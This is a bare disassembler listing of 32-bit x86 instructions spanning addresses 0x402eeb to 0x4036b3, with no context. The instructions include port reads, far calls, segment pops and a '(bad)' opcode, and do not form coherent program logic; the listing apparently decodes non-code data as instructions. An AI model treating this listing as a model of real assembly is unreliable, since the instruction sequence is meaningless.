  402eeb:	add    DWORD PTR [esp+edx*4+0x12],eax
  402eef:	nop
  402ef0:	or     DWORD PTR [eax+0xc413a48],eax
  402ef6:	push   edx
  402ef7:	mov    eax,ds:0x2028511
  402efc:	add    BYTE PTR [eax],al
  402efe:	mov    al,ds:0x9a374010
  402f03:	push   0x900280fb
  402f08:	in     al,0x4a
  402f0a:	and    BYTE PTR ds:0x542682d0,al
  402f10:	inc    ebx
  402f11:	inc    edx
  402f12:	inc    esp
  402f13:	adc    al,BYTE PTR [ecx+eiz*2]
  402f16:	add    BYTE PTR [eax],dl
  402f18:	add    BYTE PTR [eax],cl
  402f1a:	loope  0x402f34
  402f1c:	add    eax,0x7c421400
  402f21:	xor    BYTE PTR [ecx-0x6f],al
  402f24:	pop    ss
  402f25:	add    BYTE PTR [eax],al
  402f27:	pushf  
  402f28:	test   DWORD PTR [eax],eax
  402f2a:	add    BYTE PTR [edx+ebp*2],al
  402f2d:	and    BYTE PTR [eax+ebx*1],al
  402f30:	add    BYTE PTR [eax],0x40
  402f33:	adc    al,BYTE PTR [ecx]
  402f35:	add    esp,DWORD PTR [eax]
  402f37:	add    BYTE PTR [edx],al
  402f39:	mov    ds:0x42240818,eax
  402f3e:	add    BYTE PTR [ecx-0x74],dl
  402f41:	and    eax,0x4004aa1
  402f46:	sub    BYTE PTR [edx],cl
  402f48:	loopne 0x402f6a
  402f4a:	add    al,0x2
  402f4c:	add    DWORD PTR [ecx],eax
  402f4e:	inc    ebx
  402f4f:	inc    ecx
  402f50:	add    eax,0x9415ff08
  402f55:	jb     0x402f98
  402f57:	add    BYTE PTR [edx],bl
  402f59:	and    BYTE PTR [edx-0x1f34ae00],0x2
  402f60:	add    BYTE PTR [eax-0x4ab75679],ah
  402f66:	dec    eax
  402f67:	and    BYTE PTR [eax+0x10801042],cl
  402f6d:	add    eax,DWORD PTR [edx-0x6bf5fba0]
  402f73:	rcl    DWORD PTR [ebp+0x1c525680],1
  402f79:	and    al,0x22
  402f7b:	enter  0xa810,0x26
  402f7f:	inc    eax
  402f80:	inc    ecx
  402f81:	fwait
  402f82:	or     BYTE PTR [eax+0x68],dh
  402f85:	or     BYTE PTR [eax],al
  402f87:	bswap  eax
  402f89:	mov    dl,0xa
  402f8b:	cwde   
  402f8c:	add    BYTE PTR [ecx+ecx*2],al
  402f8f:	adc    DWORD PTR [eax],ebp
  402f91:	pusha  
  402f92:	or     BYTE PTR [ecx],ch
  402f94:	mov    ebx,DWORD PTR [edx+0x20]
  402f97:	push   eax
  402f98:	pusha  
  402f99:	and    BYTE PTR ds:0x80981380,al
  402f9f:	retf   0x8031
  402fa2:	add    BYTE PTR [ecx],al
  402fa4:	dec    ecx
  402fa5:	xchg   ecx,eax
  402fa6:	mov    ah,BYTE PTR [eax]
  402fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fa9:	dec    eax
  402faa:	adc    BYTE PTR [eax-0x5e],cl
  402fad:	push   es
  402fae:	inc    esp
  402faf:	mov    BYTE PTR [eax],cl
  402fb1:	cmp    BYTE PTR [eax+0x4c],dl
  402fb4:	or     BYTE PTR [ecx+0x51],al
  402fb7:	push   0x92000802
  402fbc:	add    DWORD PTR [eax+0x8],esi
  402fbf:	or     BYTE PTR [edx],al
  402fc1:	add    BYTE PTR [edx],cl
  402fc3:	pusha  
  402fc4:	in     eax,0x60
  402fc6:	add    ch,BYTE PTR [edx]
  402fc8:	adc    al,cl
  402fca:	add    al,0x50
  402fcc:	xchg   ebx,eax
  402fcd:	jo     0x402fd9
  402fcf:	or     dl,dl
  402fd1:	add    DWORD PTR [edx],eax
  402fd3:	push   edx
  402fd4:	adc    DWORD PTR [eax+0x59],edi
  402fd7:	push   edx
  402fd8:	pop    eax
  402fd9:	test   eax,0x10fd4
  402fde:	sub    dl,al
  402fe0:	push   ecx
  402fe1:	and    al,0x40
  402fe3:	adc    BYTE PTR [ecx],bl
  402fe5:	add    DWORD PTR [eax+ebp*4-0x58def7b4],eax
  402fec:	or     esp,DWORD PTR [edx+0x0]
  402fef:	and    eax,0x4c4
  402ff4:	add    BYTE PTR [esi],al
  402ff6:	cmp    al,0x48
  402ff8:	inc    edx
  402ff9:	add    BYTE PTR [edx],cl
  402ffb:	adc    ah,BYTE PTR ds:0x4080902
  403001:	adc    BYTE PTR [eax+edx*4],al
  403004:	pusha  
  403005:	or     BYTE PTR [esi],0x8
  403008:	add    DWORD PTR [ecx],eax
  40300a:	add    DWORD PTR [edx+eiz*1],ecx
  40300d:	jb     0x40303f
  40300f:	or     al,BYTE PTR [eax-0x50]
  403012:	adc    BYTE PTR [edx-0x80],al
  403015:	add    al,BYTE PTR [ecx+0x0]
  403018:	arpl   WORD PTR [eax+ebx*1+0xc222890],si
  40301f:	pop    edx
  403020:	add    ah,BYTE PTR [ecx]
  403022:	or     al,0x82
  403024:	cmp    al,0x1
  403026:	xchg   ebp,eax
  403027:	inc    eax
  403028:	inc    esi
  403029:	add    BYTE PTR [eax],dl
  40302b:	inc    eax
  40302c:	or     BYTE PTR [ecx],0x0
  40302f:	test   BYTE PTR [eax],al
  403031:	mov    eax,ds:0x11214352
  403036:	and    DWORD PTR [eax+0x0],0x13064244
  40303d:	fcom   DWORD PTR [eax]
  40303f:	inc    ebx
  403040:	add    ch,BYTE PTR [ecx+0x0]
  403043:	adc    BYTE PTR [ecx+0x52],bl
  403046:	add    BYTE PTR [ebx+edx*1],dh
  403049:	mov    al,BYTE PTR [eax]
  40304b:	add    DWORD PTR [eax],eax
  40304d:	test   BYTE PTR [eax+0x6],al
  403050:	add    eax,DWORD PTR [edx+0x50d211]
  403056:	inc    edx
  403057:	mov    eax,ds:0x2a080b42
  40305c:	xor    eax,0x904120a2
  403061:	add    al,al
  403063:	or     BYTE PTR [edx+eax*1],ah
  403066:	add    BYTE PTR [edx+0x8],cl
  403069:	mov    al,ah
  40306b:	add    ah,BYTE PTR [eax]
  40306d:	xchg   ecx,eax
  40306e:	or     dl,dl
  403070:	mov    WORD PTR [eax+0x16184400],es
  403076:	mov    BYTE PTR [ecx+eax*1],bl
  403079:	dec    ecx
  40307a:	ret    0xe6c
  40307d:	and    al,0x14
  40307f:	add    eax,0x388001c0
  403084:	adc    BYTE PTR [ebx],dl
  403086:	rol    BYTE PTR [esi+0x4],0x4
  40308a:	add    BYTE PTR [ebx],dl
  40308c:	or     al,BYTE PTR [ecx+0x30]
  40308f:	pusha  
  403090:	or     dl,BYTE PTR [edx-0x37697db9]
  403096:	and    DWORD PTR [edx],ecx
  403098:	push   es
  403099:	or     al,0xc0
  40309b:	adc    BYTE PTR [ebx],ah
  40309d:	enter  0x248,0x21
  4030a1:	mov    DWORD PTR [edx-0x2e],ecx
  4030a4:	and    ah,BYTE PTR [edi]
  4030a6:	sub    eax,DWORD PTR [edx-0x78]
  4030a9:	add    BYTE PTR [eax+0x8250d08],al
  4030af:	adc    BYTE PTR [eax],0x16
  4030b2:	mov    al,ds:0x3000c406
  4030b7:	dec    eax
  4030b8:	add    BYTE PTR [ebp+0x2],al
  4030bb:	jno    0x4030c0
  4030bd:	add    BYTE PTR [ecx],dh
  4030bf:	xchg   esp,eax
  4030c0:	pop    ds
  4030c1:	sbb    BYTE PTR [esi],cl
  4030c3:	ror    BYTE PTR [esp+ecx*1+0x20208e1],0x80
  4030cb:	mov    al,BYTE PTR [edx]
  4030cd:	add    al,0x20
  4030cf:	adc    eax,DWORD PTR [edx+0x32]
  4030d2:	dec    esp
  4030d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030d4:	pop    eax
  4030d5:	xchg   BYTE PTR [eax],cl
  4030d7:	dec    eax
  4030d8:	or     BYTE PTR [eax],dl
  4030da:	adc    bl,BYTE PTR [ebx]
  4030dc:	add    al,BYTE PTR [eax]
  4030de:	add    dl,dl
  4030e0:	add    BYTE PTR [eax+0x40],al
  4030e3:	or     BYTE PTR [eax+0x905],ch
  4030e9:	add    BYTE PTR [eax],cl
  4030eb:	add    BYTE PTR [ebx+0x31440803],cl
  4030f1:	inc    ecx
  4030f2:	sbb    BYTE PTR [edx],dl
  4030f4:	adc    BYTE PTR [ecx],dl
  4030f6:	or     dl,0x2
  4030f9:	adc    al,BYTE PTR [ecx+0x9b40048]
  4030ff:	mov    BYTE PTR [eax+0x22],cl
  403102:	add    al,0x1c
  403104:	sbb    BYTE PTR [ecx],ch
  403106:	add    al,0x24
  403108:	or     BYTE PTR [eax],ah
  40310a:	dec    esi
  40310b:	mov    eax,0xc1318244
  403110:	inc    esi
  403111:	add    BYTE PTR [eax],dl
  403113:	add    DWORD PTR [eax+eiz*8],eax
  403116:	add    cl,BYTE PTR [ebx+0x3]
  403119:	or     BYTE PTR [edx+ebx*8+0x4b001105],ah
  403120:	add    BYTE PTR [eax],dl
  403122:	push   ds
  403123:	and    eax,0x81506830
  403128:	adc    cl,BYTE PTR [eax+0x420e2008]
  40312e:	inc    esi
  40312f:	mov    BYTE PTR [edx],cl
  403131:	dec    eax
  403132:	inc    edx
  403133:	add    cl,BYTE PTR [ecx]
  403135:	mov    WORD PTR [edx+eax*8],es
  403138:	and    al,0x15
  40313a:	mov    al,ds:0x340402
  40313f:	or     al,0x2
  403141:	add    DWORD PTR [eax],eax
  403143:	inc    esp
  403144:	cwde   
  403145:	inc    eax
  403146:	inc    eax
  403147:	or     al,bl
  403149:	or     BYTE PTR [eax],0x0
  40314c:	stos   DWORD PTR es:[edi],eax
  40314d:	add    dl,BYTE PTR [ecx+0x28]
  403150:	add    BYTE PTR es:0x481e48e2,ch
  403157:	or     ax,cx
  40315a:	and    eax,0xe1200320
  40315f:	or     BYTE PTR [edx-0x80],bh
  403162:	add    bh,BYTE PTR [eax+edx*1]
  403165:	and    BYTE PTR [edx],cl
  403167:	add    dl,al
  403169:	add    DWORD PTR [ecx],eax
  40316b:	and    edx,DWORD PTR [ecx]
  40316d:	rcl    BYTE PTR ds:0x80b42220,cl
  403173:	sbb    BYTE PTR [ecx+ecx*1],al
  403176:	nop
  403177:	xor    BYTE PTR [edx],cl
  403179:	or     al,0x29
  40317b:	pop    ebp
  40317c:	add    BYTE PTR [edx],al
  40317e:	xor    al,BYTE PTR [eax-0x40]
  403181:	xchg   DWORD PTR [eax],ebx
  403183:	imul   eax,ebp,0x7c184886
  403189:	or     dh,BYTE PTR [esi]
  40318b:	and    ecx,DWORD PTR [ecx]
  40318d:	inc    eax
  40318e:	mov    WORD PTR [edx],fs
  403190:	add    bl,BYTE PTR [ebx]
  403192:	or     DWORD PTR [eax+eax*1+0x41],ecx
  403196:	or     DWORD PTR ds:0x820e8303,esp
  40319c:	add    ah,BYTE PTR [esi+0x0]
  40319f:	inc    ecx
  4031a0:	and    BYTE PTR ds:0x59c1100,cl
  4031a6:	add    DWORD PTR [edx],eax
  4031a8:	adc    al,0x90
  4031aa:	add    al,BYTE PTR [edx+ebp*4]
  4031ad:	adc    BYTE PTR [edx],dl
  4031af:	push   cs
  4031b0:	inc    edx
  4031b1:	adc    BYTE PTR [edx+0x40c44280],al
  4031b7:	add    DWORD PTR [eax],esp
  4031b9:	adc    BYTE PTR [eax+ecx*1-0x80],0x2c
  4031be:	add    DWORD PTR [esi],ecx
  4031c0:	or     BYTE PTR [esi+0x66],0x24
  4031c4:	sub    BYTE PTR [eax+eax*4-0x1ffeecee],al
  4031cb:	add    eax,0xc5a0f0a1
  4031d0:	call   0x28c4b1e9
  4031d5:	sbb    BYTE PTR [edx],al
  4031d7:	mov    cl,0xe4
  4031d9:	add    eax,0x10120028
  4031de:	sti    
  4031df:	call   0xc86135e4
  4031e4:	add    al,0xa0
  4031e6:	call   0x55d61ee
  4031eb:	or     DWORD PTR [ecx-0x1aabffff],esp
  4031f1:	inc    eax
  4031f2:	add    al,0x44
  4031f4:	xor    eax,0x12944182
  4031f9:	rcl    DWORD PTR [ecx+eax*1],1
  4031fc:	or     BYTE PTR [eax],cl
  4031fe:	inc    esi
  4031ff:	add    BYTE PTR [edx+0x2000000],al
  403205:	and    DWORD PTR [eax],0x8d21c100
  40320b:	add    BYTE PTR [eax],bl
  40320d:	push   eax
  40320e:	cmp    BYTE PTR [eax+0x10],al
  403211:	add    BYTE PTR [eax],0x10
  403214:	add    eax,0x26a554
  403219:	dec    edx
  40321a:	cmp    DWORD PTR [eax+0x2a820492],ecx
  403220:	add    ecx,DWORD PTR [esi+0x46]
  403223:	adc    DWORD PTR [eax],0xd14a030e
  403229:	sbb    BYTE PTR [edx+0x0],cl
  40322c:	pop    es
  40322d:	sbb    al,0x23
  40322f:	mov    dl,al
  403231:	add    dl,BYTE PTR [eax+0x28]
  403234:	retf   0x9
  403237:	adc    BYTE PTR [eax],al
  403239:	xor    al,BYTE PTR [edx]
  40323b:	or     BYTE PTR [eax+0x614ab008],ch
  403241:	mov    BYTE PTR [eax+0x1e],dh
  403244:	rol    BYTE PTR [edi],0x0
  403247:	adc    DWORD PTR [ecx],eax
  403249:	and    DWORD PTR [esi+0x187400],0x41a55
  403253:	call   0x555bf258
  403258:	add    BYTE PTR [ebx],cl
  40325a:	fdiv   DWORD PTR [edx]
  40325c:	test   BYTE PTR [esp+eiz*4],al
  40325f:	add    BYTE PTR [eax-0x7dacea48],ah
  403265:	add    BYTE PTR [ebx],0x80
  403268:	sbb    BYTE PTR [ecx],al
  40326a:	inc    eax
  40326b:	or     al,0x6d
  40326d:	test   DWORD PTR [ebx+eax*4],esp
  403270:	add    BYTE PTR [eax+edx*4],al
  403273:	add    al,0x0
  403275:	adc    DWORD PTR [ecx+ecx*4],0x60460602
  40327c:	add    BYTE PTR [ebx+0x33],al
  40327f:	add    BYTE PTR [edx],cl
  403281:	or     eax,0x4418000d
  403286:	or     eax,DWORD PTR [eax+esi*1]
  403289:	add    DWORD PTR [edx],0x29368a28
  40328f:	or     dh,BYTE PTR [eax+0x20]
  403292:	adc    al,0x40
  403294:	cwde   
  403295:	and    al,BYTE PTR [edx+0x21]
  403298:	inc    ebx
  403299:	or     eax,DWORD PTR [ecx+eax*1]
  40329c:	add    BYTE PTR [eax],bh
  40329e:	push   esi
  40329f:	ins    BYTE PTR es:[edi],dx
  4032a0:	jo     0x40322a
  4032a2:	je     0x4032ac
  4032a4:	ror    BYTE PTR [edx],0x87
  4032a7:	sub    BYTE PTR [ebx],dl
  4032a9:	or     BYTE PTR [eax-0x66],al
  4032ac:	adc    BYTE PTR [eax],0x44
  4032af:	add    DWORD PTR [edx],esi
  4032b1:	inc    eax
  4032b2:	sbb    al,0x8
  4032b4:	add    dl,BYTE PTR [ecx+0x4518088]
  4032ba:	add    BYTE PTR [eax],al
  4032bc:	add    al,BYTE PTR [ecx]
  4032be:	fadd   DWORD PTR [eax]
  4032c0:	add    al,0x26
  4032c2:	dec    eax
  4032c3:	add    al,0x4
  4032c5:	imul   eax,DWORD PTR [ecx],0xe0000938
  4032cb:	push   esp
  4032cc:	dec    eax
  4032cd:	inc    eax
  4032ce:	or     BYTE PTR [eax+0x22],0xa
  4032d2:	stos   BYTE PTR es:[edi],al
  4032d3:	or     eax,0xc0538402
  4032d8:	push   es
  4032d9:	and    ecx,eax
  4032db:	sub    DWORD PTR [ecx+0x32],eax
  4032de:	mov    ss,WORD PTR [eax]
  4032e0:	inc    edx
  4032e1:	add    BYTE PTR [ecx],al
  4032e3:	sub    BYTE PTR [edi],0x50
  4032e6:	add    al,0xf
  4032e8:	mov    ds:0x99001842,al
  4032ed:	xor    DWORD PTR ds:0x214004b,eax
  4032f3:	bound  eax,QWORD PTR [ecx]
  4032f5:	add    BYTE PTR [eax],al
  4032f7:	adc    BYTE PTR [ecx],ah
  4032f9:	and    DWORD PTR [ecx],eax
  4032fb:	and    dl,BYTE PTR [ecx+0x20]
  4032fe:	sbb    al,0x1
  403300:	add    BYTE PTR [eax],al
  403302:	adc    ecx,DWORD PTR [ecx+0x61]
  403305:	or     al,BYTE PTR [eax]
  403307:	jo     0x403379
  403309:	add    al,BYTE PTR [esp+ebx*1]
  40330c:	add    al,0x0
  40330e:	push   ebx
  40330f:	inc    eax
  403310:	add    BYTE PTR [eax],cl
  403312:	rcr    BYTE PTR [edx+esi*1],0x80
  403316:	test   BYTE PTR [ecx],al
  403318:	mov    al,ds:0x80b04641
  40331d:	or     dl,BYTE PTR [ebx+0x44]
  403320:	add    al,0xa4
  403322:	add    al,0x49
  403324:	adc    DWORD PTR [ebx],0x45003e
  40332a:	and    DWORD PTR [eax+eax*4],esp
  40332d:	inc    ebx
  40332e:	adc    BYTE PTR [eax],al
  403330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403331:	inc    ebx
  403332:	adc    BYTE PTR [edx+0x330501a],dl
  403338:	adc    eax,DWORD PTR [ecx]
  40333a:	bound  eax,QWORD PTR [eax]
  40333c:	mov    BYTE PTR [edx-0x7fcbc000],ah
  403342:	jo     0x40334e
  403344:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403345:	adc    eax,0x188007a4
  40334a:	add    edx,DWORD PTR [eax]
  40334c:	enter  0x1204,0x44
  403350:	add    BYTE PTR [eax+0x12208207],0x10
  403357:	xor    ecx,DWORD PTR [ecx]
  403359:	or     al,al
  40335b:	inc    edx
  40335c:	and    DWORD PTR [eax+0x49020840],0x8f238d04
  403366:	or     al,BYTE PTR [eax+0xd6e400]
  40336c:	mov    al,ds:0xe021d034
  403371:	sub    al,0x2
  403373:	pusha  
  403374:	and    eax,0x12045032
  403379:	add    cl,BYTE PTR [eax]
  40337b:	or     BYTE PTR [ecx],al
  40337d:	or     eax,DWORD PTR [eax+0x23]
  403380:	and    BYTE PTR [eax-0x54d80000],al
  403386:	mov    al,0x10
  403388:	or     BYTE PTR [ecx],al
  40338a:	add    eax,0x30
  40338d:	cmp    BYTE PTR [esi+0x0],0xc0
  403391:	dec    ecx
  403392:	dec    esp
  403393:	push   eax
  403394:	mov    eax,ds:0x201a080
  403399:	add    eax,0x70888
  40339e:	add    al,0x4
  4033a0:	inc    eax
  4033a1:	loopne 0x4033b1
  4033a3:	and    DWORD PTR [eax],eax
  4033a5:	and    BYTE PTR [ebx+ecx*2+0x2c30221],al
  4033ac:	sub    eax,0x9c12812d
  4033b1:	test   al,0x43
  4033b3:	test   al,ch
  4033b5:	add    al,0x14
  4033b7:	add    ch,BYTE PTR [eax+0x2]
  4033ba:	add    ecx,DWORD PTR ds:0xc5087302
  4033c0:	nop
  4033c1:	add    BYTE PTR [eax],cl
  4033c3:	or     BYTE PTR [eax],ah
  4033c5:	inc    esp
  4033c6:	and    DWORD PTR [edx],eax
  4033c8:	popa   
  4033c9:	and    al,0x2a
  4033cb:	in     al,0xd0
  4033cd:	pusha  
  4033ce:	add    ah,BYTE PTR [edx-0x30]
  4033d1:	sbb    ah,BYTE PTR [edx+eax*8+0x5d14501]
  4033d8:	add    DWORD PTR [eax+ebp*1],ebx
  4033db:	add    eax,0x20051800
  4033e0:	inc    ebp
  4033e1:	push   eax
  4033e2:	inc    eax
  4033e3:	pushf  
  4033e4:	pushf  
  4033e5:	or     BYTE PTR [eax+eax*1+0x828280],cl
  4033ec:	add    BYTE PTR [eax],ah
  4033ee:	or     BYTE PTR [ebp-0x7f],ch
  4033f1:	mov    eax,ds:0x480801
  4033f6:	add    BYTE PTR [eax+0x2284a00],al
  4033fc:	add    al,0x0
  4033fe:	add    BYTE PTR [edx+0x14],al
  403401:	dec    eax
  403402:	add    BYTE PTR [ecx+0x180110e],dl
  403408:	xchg   BYTE PTR gs:[eax+0x76021920],al
  40340f:	add    BYTE PTR [ecx],al
  403411:	xchg   edx,eax
  403412:	das    
  403413:	inc    ecx
  403414:	inc    eax
  403415:	adc    DWORD PTR [ecx-0x41afa1b0],eax
  40341b:	lds    ebx,FWORD PTR [eax]
  40341d:	adc    BYTE PTR [eax+0x68],0xb4
  403421:	inc    edx
  403422:	xor    BYTE PTR [ecx+esi*1],al
  403425:	dec    esp
  403426:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403427:	add    ch,BYTE PTR [eax+0x1402016]
  40342d:	or     BYTE PTR [ecx],bl
  40342f:	or     dh,BYTE PTR [ebx]
  403431:	adc    edx,DWORD PTR [eax+0xd490043]
  403437:	add    eax,0xc42868
  40343c:	ror    DWORD PTR [ecx+0x42],1
  40343f:	or     BYTE PTR [ebp+0x5],ah
  403442:	or     al,BYTE PTR [eax-0x3d]
  403445:	loopne 0x403499
  403447:	add    al,0x11
  40344a:	mov    al,ds:0x80006
  40344f:	test   BYTE PTR [eax+0x5],bl
  403452:	or     al,0xb0
  403455:	test   BYTE PTR [esp+edx*4+0x2029608c],dl
  40345c:	adc    BYTE PTR [esi],dl
  40345e:	ror    BYTE PTR [edx+0xf0521],cl
  403464:	sbb    BYTE PTR [esi-0x70],0x83
  403468:	add    dl,dh
  40346a:	xchg   edx,eax
  40346b:	or     BYTE PTR [edx],dl
  40346d:	add    BYTE PTR [ecx],al
  40346f:	or     DWORD PTR [edx],edx
  403471:	test   BYTE PTR [edi+eax*1],dh
  403474:	sub    ebx,DWORD PTR [eax+eiz*1-0x6f]
  403478:	add    al,BYTE PTR [edx+0x49]
  40347b:	add    al,BYTE PTR [edx]
  40347d:	inc    eax
  40347e:	sub    BYTE PTR [eax+0x10412441],0x0
  403485:	pusha  
  403486:	or     eax,0x960048
  40348b:	fs push es
  40348d:	leave  
  40348e:	add    al,BYTE PTR [ecx-0x567fbd20]
  403494:	nop
  403495:	es pop es
  403497:	adc    al,BYTE PTR [edx]
  403499:	mov    BYTE PTR [eax],al
  40349b:	adc    al,0x4
  40349d:	or     al,BYTE PTR [eax+0x22]
  4034a0:	add    BYTE PTR [edx],al
  4034a2:	retf   
  4034a3:	xchg   edx,eax
  4034a4:	sub    BYTE PTR [eax+eax*1],cl
  4034a7:	inc    eax
  4034a8:	sbb    cl,BYTE PTR [eax+0x14]
  4034ab:	rcr    BYTE PTR [eax-0x7b],0x1d
  4034af:	loop   0x403434
  4034b1:	add    al,0xa0
  4034b4:	or     al,0x10
  4034b6:	dec    eax
  4034b7:	add    BYTE PTR [ebx-0x7feffff0],0x8
  4034be:	push   cs
  4034bf:	push   es
  4034c0:	or     BYTE PTR [eax],cl
  4034c2:	or     al,0xb4
  4034c4:	add    BYTE PTR [eax],ah
  4034c6:	sub    BYTE PTR ds:0x4228941,bh
  4034cc:	stos   DWORD PTR es:[edi],eax
  4034cd:	pop    ecx
  4034ce:	push   es
  4034cf:	dec    eax
  4034d0:	or     al,0x28
  4034d2:	add    al,BYTE PTR [ebx]
  4034d4:	inc    ebp
  4034d5:	les    ecx,FWORD PTR [esi]
  4034d7:	mov    DWORD PTR [ecx],ebx
  4034d9:	push   es
  4034da:	and    BYTE PTR ds:0x4818511,al
  4034e0:	adc    al,BYTE PTR [eax+0x44104004]
  4034e6:	popa   
  4034e7:	or     BYTE PTR [ecx],dh
  4034e9:	inc    esp
  4034ea:	pop    es
  4034eb:	adc    BYTE PTR [ecx+0x20],cl
  4034ee:	inc    eax
  4034ef:	pop    ecx
  4034f0:	xor    BYTE PTR [eax+0x44400008],al
  4034f6:	or     al,0x15
  4034f8:	add    BYTE PTR [ecx-0x48],al
  4034fb:	or     al,0xc0
  4034fd:	and    DWORD PTR [eax],eax
  4034ff:	push   ecx
  403500:	loop   0x403544
  403502:	xor    DWORD PTR [eax-0x1f],eax
  403505:	sbb    al,BYTE PTR [edx+eax*1]
  403508:	rol    BYTE PTR [eax+0x800890],1
  40350e:	dec    esp
  40350f:	mov    al,ds:0x31445ce
  403514:	loop   0x4034fa
  403516:	add    BYTE PTR [eax+eax*1],0x41
  40351a:	and    BYTE PTR [eax],al
  40351c:	or     DWORD PTR [eax+0x2000d000],eax
  403522:	push   es
  403523:	add    BYTE PTR [edx],al
  403525:	inc    edx
  403526:	lds    edx,FWORD PTR [eax]
  403528:	pusha  
  403529:	pop    ss
  40352a:	add    cl,BYTE PTR [eax]
  40352c:	pop    ss
  40352d:	dec    eax
  40352e:	cmp    BYTE PTR [ecx+eax*1],0x4
  403532:	add    eax,DWORD PTR [eax]
  403534:	inc    edx
  403535:	ss test al,0x1
  403538:	or     BYTE PTR [edx],al
  40353a:	dec    eax
  40353b:	add    al,0xc6
  40353d:	adc    BYTE PTR cs:[eax],dl
  403540:	add    eax,DWORD PTR [esi]
  403542:	push   es
  403543:	rcl    BYTE PTR [ecx],0x0
  403546:	jo     0x4034c9
  403548:	dec    ecx
  403549:	push   0xe0560340
  40354e:	or     BYTE PTR [eax],0x0
  403551:	scas   al,BYTE PTR es:[edi]
  403552:	inc    ecx
  403553:	pop    es
  403554:	xor    DWORD PTR [ebx-0x5c],eax
  403557:	imul   eax,DWORD PTR [ecx],0x9
  40355a:	mov    al,0xc8
  40355c:	inc    eax
  40355d:	add    edx,DWORD PTR [eax]
  40355f:	nop
  403560:	add    DWORD PTR [eax],0x1146040
  403566:	push   es
  403567:	dec    ecx
  403568:	or     al,0x16
  40356a:	push   edx
  40356b:	je     0x403573
  40356d:	inc    eax
  40356e:	les    eax,FWORD PTR [ecx]
  403570:	test   al,0x4
  403572:	add    al,0x41
  403574:	add    BYTE PTR [eax+0x3b],al
  403577:	and    BYTE PTR [ebx],cl
  403579:	sub    DWORD PTR cs:[ecx],esp
  40357c:	pop    es
  40357d:	test   BYTE PTR [edx+0x28],al
  403580:	bound  ebx,QWORD PTR [esi]
  403582:	or     al,0x88
  403584:	dec    eax
  403585:	push   esi
  403586:	or     BYTE PTR [eax+0x6e013002],ch
  40358c:	add    BYTE PTR [edx],al
  40358e:	or     BYTE PTR [eax],cl
  403590:	nop
  403591:	nop
  403592:	cmp    BYTE PTR fs:[edx],al
  403595:	add    eax,0x984ca08a
  40359a:	and    BYTE PTR [eax],bl
  40359c:	add    DWORD PTR [esp+eax*1],esp
  40359f:	call   0xc209:0x6043a091
  4035a6:	jmp    0x9940:0x4003b301
  4035ad:	test   BYTE PTR [eax],dl
  4035af:	dec    edx
  4035b0:	add    al,BYTE PTR [eax+0x1c906]
  4035b6:	movaps xmm0,XMMWORD PTR [eax]
  4035b9:	test   BYTE PTR [edx],cl
  4035bb:	or     DWORD PTR [edx+0x10],esp
  4035be:	adc    DWORD PTR [eax],eax
  4035c0:	mov    ds:0x280a9448,al
  4035c5:	adc    BYTE PTR [edx+0x0],0x0
  4035c9:	and    BYTE PTR [eax+0x60a0e280],cl
  4035cf:	and    BYTE PTR [eax],dl
  4035d1:	mov    al,BYTE PTR [edx+0x7]
  4035d4:	inc    esp
  4035d5:	dec    eax
  4035d6:	mov    al,0x5
  4035d8:	test   eax,0x61a00082
  4035dd:	add    al,BYTE PTR ds:0x52408045
  4035e3:	adc    al,BYTE PTR [ecx]
  4035e5:	add    al,0x4
  4035e7:	add    DWORD PTR [eax],0x1b06080
  4035ed:	inc    eax
  4035ee:	add    BYTE PTR [edi],cl
  4035f0:	xchg   ecx,eax
  4035f1:	sub    BYTE PTR [edx+0x18],al
  4035f4:	adc    BYTE PTR [eax],al
  4035f6:	adc    BYTE PTR [edx+eiz*1],0x88
  4035fa:	or     eax,0x46620481
  4035ff:	loopne 0x40362a
  403601:	add    BYTE PTR [ecx+0xc143051],ah
  403607:	inc    eax
  403608:	add    cl,dl
  40360a:	adc    ah,BYTE PTR [ecx+0x0]
  40360d:	or     ah,BYTE PTR [edi+ecx*1]
  403610:	adc    al,BYTE PTR [eax]
  403612:	add    BYTE PTR [ebx+0x2a203821],al
  403618:	add    BYTE PTR [eax+ecx*1+0x1c011032],bl
  40361f:	ret    
  403620:	dec    eax
  403621:	and    ecx,DWORD PTR [esp+ebp*2+0x26]
  403625:	(bad)  
  403626:	dec    edx
  403627:	and    BYTE PTR es:[edx],bl
  40362a:	xchg   esp,eax
  40362b:	mov    ds:0x42049,al
  403630:	or     al,BYTE PTR [eax+eax*1]
  403633:	add    bl,al
  403635:	add    al,0x64
  403637:	add    BYTE PTR [ecx*2+0x2c083640],dl
  40363e:	xor    BYTE PTR [eax+0x41],0x92
  403642:	dec    eax
  403643:	adc    BYTE PTR [eax+0x58a862c],0x50
  40364a:	add    BYTE PTR [eax+0x60434884],cl
  403650:	sub    BYTE PTR [ecx],ah
  403652:	add    eax,DWORD PTR [eax]
  403654:	add    BYTE PTR [esi],al
  403656:	or     BYTE PTR [ecx],al
  403658:	or     BYTE PTR [edx],dl
  40365a:	adc    BYTE PTR [eax],0xa4
  40365d:	sbb    DWORD PTR [eax+0x5102000],edx
  403663:	les    eax,FWORD PTR [ebp+0x40288196]
  403669:	or     edx,DWORD PTR [edx+ecx*2+0x12202225]
  403670:	xor    DWORD PTR [ecx+ebp*1],eax
  403673:	nop
  403674:	and    BYTE PTR [esp+eax*1],al
  403677:	push   ss
  403678:	dec    ecx
  403679:	test   al,0x0
  40367b:	mov    al,ds:0xc6e10068
  403680:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403681:	adc    BYTE PTR [eax],al
  403683:	add    BYTE PTR [ecx],0xb0
  403686:	add    al,BYTE PTR ds:0x33001300
  40368c:	and    al,0x0
  40368e:	mov    WORD PTR [eax+0x300310],es
  403694:	arpl   WORD PTR [ecx+eax*1],ax
  403697:	adc    BYTE PTR [ebx],dl
  403699:	inc    edx
  40369a:	mov    DWORD PTR [eax],ecx
  40369c:	add    BYTE PTR [ecx],cl
  40369e:	adc    cl,BYTE PTR [eax]
  4036a0:	add    BYTE PTR [eax],cl
  4036a2:	adc    al,BYTE PTR [edx]
  4036a4:	jns    0x4036f7
  4036a6:	and    eax,0xe0040808
  4036ab:	add    DWORD PTR [eax],0x22
  4036ae:	adc    DWORD PTR [edx],eax
  4036b0:	pusha  
  4036b1:	add    BYTE PTR [ebx],cl
  4036b3:	add    ebp,DWORD PTR [ebx+0x4735300a]
